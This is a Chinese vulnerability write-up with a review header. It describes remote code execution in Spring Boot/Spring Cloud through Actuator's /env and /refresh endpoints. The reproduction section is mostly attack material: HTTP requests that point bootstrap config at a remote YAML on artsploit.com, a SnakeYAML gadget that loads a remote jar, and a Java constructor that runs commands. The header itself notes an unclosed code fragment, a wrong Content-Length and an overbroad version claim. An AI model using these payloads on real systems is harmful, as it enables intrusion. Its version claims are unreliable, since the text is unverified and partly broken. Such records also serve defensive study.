---
source: "hatch 补库批 20260928"
product: "Spring Cloud bootstrap/SnakeYAML"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Spring Boot 修改环境属性导致的rce"
prerequisites: "来源所述条件，未列明部分仍待核：影响Boot2.x与/env表单旧接口混用，末称最新版本可用没有日期/组件范围"
side_effects: "未执行；本文需注意的操作影响：外部载荷与状态风险；直接引用第三方yaml/jar和DNS，修改启动源且refresh无恢复"
source_status: "unknown"
id: "vw-837453fdfeeba179736a823d"
entity_id: "ve-837453fdfeeba179736a823d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：影响Boot2.x与/env表单旧接口混用，末称最新版本可用没有日期/组件范围

代码与实验材料：env→refresh→YAML及服务提供者说明，Java构造器片段未闭合；固定artsploit远程载荷/DNS域名

来源证据范围：ianxtianxt镜像，原artsploit来源未直列公告

- **事实待核（1）**：组件及版本严重泛化；依据：需SpringCloud可写env、bootstrap reload和不安全SnakeYAML，不是任意Boot2.x；最新一词不可长期使用。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：外部载荷与状态风险；依据：直接引用第三方yaml/jar和DNS，修改启动源且refresh无恢复。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（3）**：不完整载体/请求；依据：Content-Length59与正文不符，Java仅构造器片段未给完整实现但称应包含字节码。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Spring Boot 修改环境属性导致的rce

一、漏洞简介
------------

二、漏洞影响
------------

Spring Boot 2.x

三、复现过程
------------

环境下载 https://github.com/ianxtianxt/actuator-testbed

    POST /env HTTP/1.1
    Host: 127.0.0.1:8090
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 59
     
    spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml

该请求修改了"
spring.cloud.bootstrap.location"属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用"
 refresh"端点。

    POST /refresh HTTP/1.1
    Host: 127.0.0.1:8090
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0

从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：

    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
      ]]
    ]

该文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。简而言之，它导致了\*\*\'java.util.ServiceLoader＃load（java.lang.Class
，java.lang.ClassLoader）\'\*\*方法，该方法试图在所有库中查找\'ScriptEngineFactory\'接口的所有实现。在类路径中。由于我们可以通过URLClassLoader添加新的库，因此我们可以在其中包含恶意字节码的情况下为新的\'ScriptEngineFactory\'提供服务。为此，我们需要使用以下必需文件创建一个jar归档文件：https://github.com/ianxtianxt/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java应该包含实际的字节码，并在构造函数中带有恶意负载。

    public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
     
        public AwesomeScriptEngineFactory() {
            try {
                Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
                Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
            } catch (IOException e) {
                e.printStackTrace();
            }

https://github.com/ianxtianxt/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory应该只是一个包含对\'artsploit.AwesomeScriptEngineFactory\'的完整引用的文本文件，以便ServiceLoader知道在哪里可以找到该类：**artsploit.AwesomeScriptEngineFactory**同样，这种利用技术要求弹簧云位于类路径中，但是与Eureka的XStream有效负载相比，它甚至可以在最新版本中使用
